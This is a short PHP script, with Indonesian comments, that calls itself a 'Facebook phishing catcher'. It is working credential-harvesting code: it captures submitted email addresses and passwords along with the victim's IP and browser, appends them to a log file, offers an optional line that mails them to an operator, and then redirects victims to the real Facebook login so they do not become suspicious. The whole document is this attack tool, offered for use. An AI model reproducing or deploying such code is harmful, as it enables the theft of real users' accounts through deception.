<?php
// FACEBOOK PHISHING CATCHER - QUANTUM EDITION
// Luminary.Inc / Lilyeyes Quantum Core

// Konfigurasi
$log_file = 'credentials.txt';
$redirect_url = 'https://www.facebook.com/login.php'; // Redirect ke FB asli setelah catch

// Ambil data
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Format data yang dicuri
$log_entry = "==========[ FACEBOOK LOGIN ]==========\n";
$log_entry .= "Time    : $timestamp\n";
$log_entry .= "IP      : $ip\n";
$log_entry .= "Email   : $email\n";
$log_entry .= "Pass    : $password\n";
$log_entry .= "UA      : $user_agent\n";
$log_entry .= "=======================================\n\n";

// Simpan ke file (auto-create kalo ga ada)
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Bonus: kirim ke email (opsional - kalo mau realtime)
// mail("your-email@example.com", "FB Login Baru: $email", $log_entry);

// Redirect ke FB asli biar ga curiga
header("Location: $redirect_url");
exit;
?>